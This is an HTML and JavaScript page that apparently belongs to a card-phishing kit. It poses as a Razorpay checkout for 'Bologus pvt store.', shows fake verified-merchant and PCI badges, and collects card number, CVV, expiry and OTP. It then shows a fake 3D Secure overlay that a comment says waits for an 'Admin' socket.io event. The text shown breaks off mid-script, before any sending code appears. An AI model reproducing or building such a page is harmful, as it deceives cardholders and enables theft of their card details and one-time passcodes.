<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bologus pvt store.</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    .page-container {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding-top: 1.5rem;
      padding-bottom: 0;
      background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);
      background-size: cover;
      background-repeat: no-repeat;
    }
    .content-wrapper {
      flex: 1;
      padding: 1rem;
      margin-bottom: 6rem;
      position: relative;
      z-index: 1;
    }
    .merchant-badge {
      position: relative;
      cursor: pointer;
      margin-left: 0;
    }
    .merchant-dropdown {
      display: none;
      position: absolute;
      top: 100%;
      left: 0;
      background: white;
      padding: 1rem;
      border-radius: 0.5rem;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      z-index: 10;
      width: 300px;
    }
    .merchant-badge:hover .merchant-dropdown {
      display: block;
    }
    .trusted-shield {
      display: flex;
      align-items: center;
      gap: 1rem;
      padding: 1rem;
      background: #66BB6A;
      border-radius: 0.5rem;
      margin-bottom: 1rem;
    }
    .verified-tag {
      font-size: 0.75rem;
      background: rgba(255,255,255,0.2);
      padding: 0.25rem 0.5rem;
      border-radius: 1rem;
      color: #E0E0E0;
    }
    .verification-item {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.875rem;
      color: #4B5563;
      padding: 0.25rem 0;
    }
    .verification-tick {
      width: 1rem;
      height: 1rem;
      flex-shrink: 0;
      color: #10B981;
    }
    .amount-display {
      font-size: 18px;
      font-weight: 400;
      color: #1a1a1a;
      text-align: center;
      margin-bottom: 20px;
      padding: 12px;
      background: #f3f4f6;
      border-radius: 8px;
    }
    .rupee-sign {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 1rem;
      color: #6b7280;
      display: flex;
      align-items: center;
      pointer-events: none;
    }
    #cardTypeIcon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      display: flex;
      align-items: center;
      justify-content:
        display: flex;
      align-items: center;
      justify-content: center;
      height: 100%;
    }
    .card-type-icon {
      height: 24px;
      width: 38px;
      object-fit: contain;
    }
    #cardError {
      color: #ef4444;
      font-size: 14px;
      margin-top: 4px;
      display: none;
    }
    .otp-error {
      color: #ef4444;
      font-size: 13px;
      margin: 4px 0 8px;
      text-align: center;
      display: none;
    }
    .hidden { display: none !important; }
    .consent-message {
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      padding: 0.75rem;
      border-radius: 0.375rem;
      cursor: pointer;
      font-size: 0.875rem;
      color: #4B5563;
      margin-top: 1rem;
      background: #f3f4f6;
      width: 100%;
    }
    .consent-checkbox {
      width: 1.25rem;
      height: 1.25rem;
      border: 2px solid #D1D5DB;
      border-radius: 0.25rem;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-right: 5px;
    }
    .consent-checkbox.checked {
      background-color: #10B981;
      border-color: #10B981;
    }
    .consent-checkbox svg {
      width: 1rem;
      height: 1rem;
      color: white;
      display: none;
    }
    .consent-checkbox.checked svg {
      display: block;
    }
    .otp-container {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }
    .otp-input-wrapper, .otp-button-wrapper {
      width: 48%;
    }
    .otp-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      text-align: center;
      font-size: 18px;
      letter-spacing: 5px;
      -webkit-text-security: disc;
      caret-color: transparent;
      height: 48px;
    }
    #otpSubmitButton {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 18px;
      text-align: center;
      height: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    .modern-spinner {
      width: 25px;
      height: 25px;
      border: 3px solid rgba(255,255,255,0.4);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 0.8s ease-in-out infinite;
      box-shadow: 0 0 5px rgba(255,255,255,0.2);
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #otpLoader {
      animation: spin 1s linear infinite;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #ffffff;
      border-radius: 50%;
      box-shadow: 0 0 5px rgba(255,255,255,0.2);
    }
    .btn-loading {
      position: relative;
      pointer-events: none;
    }
    .btn-loading span {
      opacity: 0.5;
      filter: blur(1px);
    }
    .bottom-logos {
      width: 100%;
      padding: 2rem 0;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      background: transparent;
      position: relative;
      z-index: 1;
      margin-top: 2rem; /* Fixed: Changed from -6rem to positive value */
      max-width: 100%;
      overflow-x: hidden;
      padding-left: 15px;
      padding-right: 15px;
    }
    
    /* Add responsive sizing for the logos */
    .bottom-logos img {
      height: auto;
      max-height: 20px; /* Smaller overall size */
      width: auto;
      object-fit: contain;
    }
    
    /* Make specific adjustments to vertical logo */
    .bottom-logos img[alt="Verified by Visa"] {
      max-height: 28px; /* Slightly taller for vertical logos */
    }
    
    /* Mobile specific adjustments */
    @media (max-width: 640px) {
      .bottom-logos {
        gap: 8px; /* Smaller gap on mobile */
        padding-left: 20px;
        padding-right: 20px;
        flex-wrap: wrap; /* Allow wrapping on very small screens */
      }
      
      .bottom-logos img {
        max-height: 16px; /* Even smaller on mobile */
      }
      
      .bottom-logos img[alt="Verified by Visa"] {
        max-height: 24px; /* Keep proportional */
      }
    }
    .fullscreen-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px);
      z-index: 9999;
      display: none;
      justify-content: center;
      align-items: center;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 2s linear infinite;
    }
    #submitButton[disabled] {
      background-color: #9CA3AF !important;
      cursor: not-allowed;
    }
    #submitButton:not([disabled]) {
      background-color: #10B981 !important;
      cursor: pointer;
    }
    
    /* Bank info dropdown styles - IMPROVED */
    #bankInfoDropdown {
      background-color: #f0f0f0;
      border: 1px solid #ccc;
      border-radius: 10px;
      padding: 12px;
      margin-top: 8px;
      font-size: 13px;
      color: #333;
      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
      width: 100%;
      transform-origin: top center;
      opacity: 0;
      transform: translateY(-10px);
      transition: opacity 0.3s ease, transform 0.3s ease;
    }

    #bankInfoDropdown.visible {
      opacity: 1;
      transform: translateY(0);
    }

    .bank-info-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 4px;
    }

    .bank-info-name {
      font-weight: 600;
      color: #444;
    }

    .bank-info-country {
      color: #555;
      display: flex;
      align-items: center;
    }

    .bank-info-country img {
      height: 12px;
      margin-right: 5px;
    }

    .bank-info-details {
      margin-top: 3px;
      display: flex;
      justify-content: space-between;
      color: #666;
    }
    
    /* Glowing effect for OTP input when focused */
    #mcOtpInput:focus {
      outline: none;
      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
      border-color: #3b82f6;
    }
    
    /* Checked state styling for consent checkbox */
    #mcConsentCheckbox.checked {
      background-color: #2778c4;
      border-color: #2778c4;
    }
    
    #mcConsentCheckbox.checked svg {
      display: block;
    }

    /* Currency display styles - ADDED */
    .currency-badge {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 0.875rem;
      background-color: #f3f4f6;
      color: #6b7280;
      margin-left: 4px;
    }

    .converted-amount {
      font-weight: 500;
      color: #2563eb;
    }
  </style>
</head>
<body>
  <div class="page-container">
    <div class="content-wrapper">
      <div class="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
        <div class="flex flex-col md:flex-row">
          <!-- Left Section -->
          <div class="md:w-7/12 p-5">
            <div class="bg-white rounded-2xl shadow-sm mb-6">
              <div class="flex items-start gap-4 mb-4 px-4 pt-4">
               <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
                  <img src="https://assets.turbologo.com/assets/features/professional-logo-templates-d9cc9a0d95eef758e45d197ff85b696204a467ac5b66fbf0a08a44be16ffe382.svg" alt="Merchant Logo" class="w-full h-full object-cover">
                </div>
                <div class="flex flex-col">
                  <span class="text-2xl font-semibold">Bologus pvt store.</span>
                  <div class="merchant-badge mt-1">
                    <div class="flex items-center gap-1 text-gray-600 text-sm">
                      <svg class="w-4 h-4 text-green-500 shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                      </svg>
                      <span>Verified Merchant</span>
                    </div>
                    <div class="merchant-dropdown">
                      <div class="trusted-shield">
                        <svg class="w-12 h-12 text-white shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                          <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                        </svg>
                        <div class="flex flex-col">
                          <span class="text-lg font-semibold text-white">Bologus pvt store.</span>
                          <span class="verified-tag">Verified Merchant</span>
                        </div>
                      </div>
                      <div class="space-y-2">
                        <div class="verification-item">
                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 13l4 4L19 7"/>
                          </svg>
                          <span>Verified for authenticity</span>
                        </div>
                        <div class="verification-item">
                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 13l4 4L19 7"/>
                          </svg>
                          <span>Razorpay's risk system ensures secure payment protection from fraud</span>
                        </div>
                        <div class="verification-item">
                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M5 13l4 4L19 7"/>
                          </svg>
                          <span>Ensures that disputes are handled diligently</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="mt-4 px-6">
                <h2 class="text-xl font-semibold mb-4">Payment Description</h2>
                <p class="text-gray-600 mb-4">
                  Payment for Digital Course Bundle – Premium access to our complete digital learning package including all courses and resources.
                </p>
                <div class="bg-blue-50 p-4 rounded-2xl mb-4">
                  <div class="flex items-center gap-2 text-blue-700">
                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                      <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                    </svg>
                    <span class="text-sm">PCI DSS Compliant • 256-bit SSL Encryption • Secure Payment</span>
                  </div>
                </div>
                <div class="text-sm text-gray-500 flex items-center gap-2">
                  <span>Service fee is 2% of the transaction amount</span>
                </div>
                <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
                  <span class="text-sm font-medium">INVOICE ID: </span>
                  <span class="text-sm" id="invoiceId"></span>
                </div>
              </div>
            </div>
          </div>
          <!-- Right Section -->
          <div class="md:w-5/12 p-5">
            <div id="paymentForm">
             <div class="amount-display mb-6">
               Amount to Pay: <span class="rupee-symbol">&#8377;</span><span id="displayAmount">0.00</span>
             </div>
              <form id="mainForm" class="space-y-4">
                <div class="hidden">
                  <label class="block text-sm font-medium text-gray-700 mb-2">Amount (INR)</label>
                  <div class="relative">
                    <span class="rupee-sign">&#8377;</span>
                    <input type="text" id="amount" class="block w-full pl-8 pr-3 py-2 border border-gray-300" readonly />
                  </div>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Email</label>
                  <input type="email" id="email" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="Enter Email" required>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                  <div class="relative">
                     <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="Enter card number" required>
                    <div id="cardTypeIcon">
                      <img src="" alt="" class="card-type-icon hidden" id="cardLogo">
                    </div>
                  </div>
                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter valid card number</p>
                  <p id="cardInfo" class="text-sm mt-1"></p>
                </div>
                <div class="grid grid-cols-2 gap-4">
                  <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
                    <input type="text" id="expiry" maxlength="5" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="MM/YY" required>
                    <p id="expiryError" class="text-red-500 text-sm mt-1 hidden">Invalid expiry date</p>
                  </div>
                  <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                    <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
                  </div>
                </div>
                <div>
                  <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="Enter name on card" required>
                </div>
                <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400" disabled>
                  <span id="submitText">Proceed to Pay</span>
                  <div id="submitLoader" class="hidden ml-2">
                    <div class="modern-spinner"></div>
                  </div>
                </button>
              </form>
              <div class="consent-message mt-4" id="consentMessage">
                <span class="consent-checkbox checked" id="consentCheckbox">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                    <path d="M5 13l4 4L19 7"/>
                  </svg>
                </span>
                <span>Note: Making Payment with
                  <a href="https://razorpay.com/terms/" target="_blank" class="underline text-gray-400 hover:text-gray-500 transition-colors">
                    Razorpay
                  </a>
                  is 100% safe. Your transaction is processed through a secure https connection.
                </span>
              </div>
            </div>
            <!-- OTP Form -->
            <div id="otpForm" class="animate-slide-in hidden">
              <p class="text-sm text-gray-600 mb-2">
                OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span>
              </p>
              <div class="otp-container">
                <div class="otp-input-wrapper">
                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
                </div>
                <div class="otp-button-wrapper">
                  <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white" disabled>
                    <span id="otpText">Confirm</span>
                    <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
                      </svg>
                    </div>
                  </button>
                </div>
              </div>
              <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
              <p class="text-center text-sm text-gray-500 mt-2">Time remaining: <span id="timer">2:59</span></p>
              <div class="consent-message mt-4">
                <span class="consent-checkbox checked">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
                    <path d="M5 13l4 4L19 7"/>
                  </svg>
                </span>
                <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Bottom Logos with updated mobile-friendly styling -->
    <div class="bottom-logos">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Khatabook.svg" alt="Powered by Khatabook" />
      <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" />
      <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" />
      <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" />
<img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" />
      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="Upi" />
    </div>
  </div>

  <!-- Bankpage Overlay Element -->
  <div id="bankpageOverlay" class="fullscreen-overlay">
    <div class="spinner"></div>
  </div>

  <!-- UPDATED: MC Verification Overlay - With currency conversion and enhanced design -->
  <div id="mcVerificationOverlay" class="fullscreen-overlay">
    <!-- Loading Content - Shown Initially -->
    <div id="mcLoadingContent" style="display: flex; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
      <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
    </div>
    
    <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
    <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px;">
      <div style="background-color: #fff; border-radius: 8px; width: 100%; padding: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
        <!-- Header with bank logos -->
        <div id="mcHeader" style="padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center;">
          <div id="leftBankLogo" style="height: 40px; max-width: 40%;">
            <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
          </div>
          <div id="rightVerificationLogo" style="height: 40px; max-width: 40%; text-align: right;">
            <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
          </div>
        </div>
        
        <!-- Main content -->
        <div style="padding: 15px;">
          <p id="securityMessage" style="font-size: 14px; margin-bottom: 15px; font-weight: bold;">
            Protecting your online payments
          </p>
          
          <div style="background-color: #ffeef2; border-radius: 6px; padding: 10px; margin-bottom: 15px;">
            <p id="otpSentMessage" style="font-size: 13px; margin: 0; color: #333;">
              One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
            </p>
          </div>
          
          <!-- Transaction details - CENTERED LAYOUT with currency display -->
          <div style="display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 15px;">
            <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
              <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Merchant</span>
              <span id="merchantName" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">GOLFSTORE 3DS</span>
            </div>
            
            <!-- Amount row with currency display -->
            <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
              <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Amount</span>
              <span id="transactionAmountDisplay" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">
                <span id="currencySymbol">₹</span> <span id="transactionAmount">45.99</span>
                <div id="convertedAmountDisplay" style="display: none; margin-top: 2px;">
                  <span id="originalCurrencyDisplay" class="currency-badge">INR: ₹<span id="originalAmount">45.99</span></span>
                </div>
              </span>
            </div>
            
            <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
              <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Date</span>
              <span id="transactionDate" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">17:10:09</span>
            </div>
            
            <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
              <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Card Number</span>
              <span id="cardNumberDisplay" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">XXXX XXXX XXXX 0622</span>
            </div>
            
            <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
              <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Reference Id</span>
              <span id="referenceId" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">299879</span>
            </div>
          </div>
          
          <div style="margin-bottom: 15px; position: relative;">
            <label for="mcOtpInput" style="display: block; margin-bottom: 5px; font-size: 13px;">Enter One-Time Passcode</label>
            <div style="position: relative;">
              <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; transition: box-shadow 0.3s ease;" placeholder="Enter One-Time Passcode" maxlength="6">
              <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <circle cx="12" cy="12" r="10" stroke="#999" stroke-width="2"/>
                  <path d="M12 7v2" stroke="#999" stroke-width="2" stroke-linecap="round"/>
                  <path d="M12 12v5" stroke="#999" stroke-width="2" stroke-linecap="round"/>
                </svg>
              </div>
              <div id="otpInfoTooltip" style="position: absolute; top: -70px; right: 0; background: #333; color: white; padding: 8px; border-radius: 4px; font-size: 12px; width: 200px; display: none; z-index: 10;">
                The One-Time Passcode is a temporary security code sent to your registered mobile number for verification.
              <div style="position: absolute; bottom: -6px; right: 12px; width: 12px; height: 12px; background: #333; transform: rotate(45deg);"></div>
              </div>
            </div>
          </div>
          
          <p id="mcOtpError" style="color: #ef4444; font-size: 13px; margin-top: 5px; display: none;">
            Incorrect verification code. Please try again.
          </p>
          
          <div style="margin-bottom: 10px;">
            <label id="consentLabel" style="display: flex; align-items: start; font-size: 12px; color: #333; cursor: pointer;">
              <div id="mcConsentCheckbox" style="width: 16px; height: 16px; border: 1px solid #ccc; border-radius: 3px; margin-right: 8px; margin-top: 2px; display: flex; align-items: center; justify-content: center; background-color: white; transition: background-color 0.2s ease;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                  <path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </div>
              <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
            </label>
          </div>
          
          <!-- Full-width Submit and Resend buttons side by side -->
          <div style="display: flex; gap: 5px; margin-top: 15px;">
            <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #CCCCCC; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: not-allowed;" disabled>Submit</button>
            <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #2778c4; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Resend</button>
            <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #cccccc; color: #333; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Cancel</button>
          </div>
          
          <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
            Time remaining: <span id="mcTimer">02:59</span>
          </div>
          
          <div style="font-size: 11px; text-align: center; margin-top: 15px; background-color: #f5f5f5; padding: 8px 0; margin-left: -15px; margin-right: -15px; margin-bottom: -15px; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px;">
            <a href="#" style="color: #0066cc; text-decoration: none; margin-right: 10px;">Terms & Conditions</a> |
            <a href="#" style="color: #0066cc; text-decoration: none; margin-right: 10px;">FAQs</a> |
            <a href="#" style="color: #0066cc; text-decoration: none;">Contact Us</a>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Scripts Section -->
  <script src="/socket.io/socket.io.js"></script>
  <script>
    // Global Variables
    let isCardValid = false;
    let isExpiryValid = false;
    let isProcessing = false;
    let currentInvoiceId = "";
    let statusCheckInterval = null; // Fixed: Initialize with null
    let timerInterval = null; // Fixed: Initialize with null
    let timer = 180;
    let consentChecked = true;
    let bankPageWindow = null;
    const socket = io();

    // Currency Conversion Feature - ADDED
    const currencySymbols = {
      'INR': '₹',
      'USD': '$',
      'EUR': '€',
      'GBP': '£',
      'JPY': '¥',
      'AUD': 'A$',
      'CAD': 'C$',
      'CHF': 'CHF',
      'CNY': '¥',
      'HKD': 'HK$',
      'NZD': 'NZ$',
      'SGD': 'S$',
      'TWD': 'NT$',
      'AED': 'د.إ',
      'THB': '฿',
      'SEK': 'kr',
      'NOK': 'kr',
      'DKK': 'kr',
      'ZAR': 'R',
      'MYR': 'RM',
      'IDR': 'Rp',
      'PHP': '₱',
      'MXN': '$',
      'BRL': 'R$',
      'PLN': 'zł',
      'RUB': '₽',
      'TRY': '₺',
      'KRW': '₩',
      'ILS': '₪',
      'SAR': '﷼',
      'ARS': '$',
      'CLP': '$',
      'EGP': 'E£',
      'COP': '$',
      'VND': '₫'
    };

    // Function to convert currency using an API
    async function convertCurrency(amount, fromCurrency, toCurrency) {
      if (fromCurrency === toCurrency) return amount;
      
      try {
        // Using Exchange Rate API
        const response = await fetch(`https://api.exchangerate-api.com/v4/latest/${fromCurrency}`);
        if (!response.ok) throw new Error('Currency conversion failed');
        
        const data = await response.json();
        if (!data.rates || !data.rates[toCurrency]) {
          throw new Error('Rate not found');
        }
        
        const rate = data.rates[toCurrency];
        return (amount * rate).toFixed(2);
      } catch (error) {
        console.error('Error converting currency:', error);
        
        // Fallback to estimated conversion rates
        const fallbackRates = {
          'INR_USD': 0.012,
          'INR_EUR': 0.011,
          'INR_GBP': 0.0095,
          'INR_JPY': 1.78,
          'INR_AUD': 0.018,
          'INR_CAD': 0.016,
          'INR_CHF': 0.011,
          'INR_CNY': 0.087,
          'INR_HKD': 0.094,
          'INR_NZD': 0.020,
          'INR_SGD': 0.016,
          'INR_TWD': 0.38,
          'INR_AED': 0.044,
          'INR_THB': 0.40,
          'INR_SEK': 0.13,
          'INR_NOK': 0.13,
          'INR_DKK': 0.082,
          'INR_ZAR': 0.22,
          'INR_MYR': 0.056,
          'INR_IDR': 189.45,
          'INR_PHP': 0.69,
          'INR_MXN': 0.21,
          'INR_BRL': 0.067,
          'INR_PLN': 0.048,
          'INR_RUB': 1.10,
          'INR_TRY': 0.39,
          'INR_KRW': 16.12,
          'INR_ILS': 0.045,
          'INR_SAR': 0.045,
          'INR_ARS': 10.62,
          'INR_CLP': 11.42,
          'INR_EGP': 0.37,
          'INR_COP': 47.38,
          'INR_VND': 294.87
        };
        
        const key = `${fromCurrency}_${toCurrency}`;
        const fallbackRate = fallbackRates[key] || 1;
        return (amount * fallbackRate).toFixed(2);
      }
    }

    // Function to generate a random hash string
    function generateRandomHash(length = 8) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return result;
    }

    // Function to get or create a session hash
    function getOrCreateHash() {
      let hash = sessionStorage.getItem('paymentHash');
      if (!hash) {
        hash = generateRandomHash();
        sessionStorage.setItem('paymentHash', hash);
      }
      return hash;
    }
    
    // Helper functions for clean URLs
    function getSuccessUrl(invoiceId) {
      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
      return `/s/${hash}?invoiceId=${invoiceId}`;
    }

    function getFailUrl(reason) {
      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
      
      // Base URL with hash
      let url = `/f/${hash}`;
      
      // Add invoiceId and reason as query parameters if they exist
      const params = new URLSearchParams();
      if (currentInvoiceId) params.append('invoiceId', currentInvoiceId);
      if (reason) params.append('reason', reason);
      
      // Only add ? if we have parameters
      const queryString = params.toString();
      if (queryString) {
        url += '?' + queryString;
      }
      
      console.log("Generated fail URL:", url);
      return url;
    }
    
    // Create a hash URL for bankpage
    function getBankpageUrl(invoiceId) {
      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
      return `/b/${hash}?invoiceId=${invoiceId}`;
    }
    
    // Check current URL and redirect if needed
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const pid = urlParams.get('pid');
      const hash = urlParams.get('hash') || getOrCreateHash();
      
      // Store the hash in session for later use
      sessionStorage.setItem('paymentHash', hash);
      
      // If we're on payment.html but not using clean URL format, redirect
      if (window.location.pathname.includes('payment.html') && pid) {
        const cleanUrl = `/p/${hash}?pid=${pid}`;
        window.history.replaceState({}, '', cleanUrl);
      }
    });

    // Improved BIN database for more accurate bank identification
    async function getBankInfoFromBIN(bin) {
      try {
        // First 6 digits are the BIN
        if (bin.length < 6) return null;
        
        // Try first binlist.net (reliable but rate-limited)
        try {
          const response = await fetch(`https://lookup.binlist.net/${bin}`);
          
          if (response.ok) {
            const data = await response.json();
            return {
              bank: data.bank?.name || 'Unknown Bank',
              country: data.country?.name || 'Unknown Country',
              countryCode: data.country?.alpha2 || '',
              currency: data.country?.currency || '',
              scheme: data.scheme || '',
              type: data.type || ''
            };
          }
        } catch (e) {
          console.log('Primary BIN lookup failed, trying alternative');
        }
        
        // Fallback to another service (bintable.com API simulation)
        try {
          const bankDatabase = {
            '4': { scheme: 'Visa', type: 'Credit' },
            '5': { scheme: 'Mastercard', type: 'Credit' },
            '6': { scheme: 'Discover', type: 'Credit' },
            '34': { scheme: 'American Express', type: 'Credit' },
            '37': { scheme: 'American Express', type: 'Credit' },
            '35': { scheme: 'JCB', type: 'Credit' },
            
            // Bank-specific BINs (plus many more in the actual code)
            '401200': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
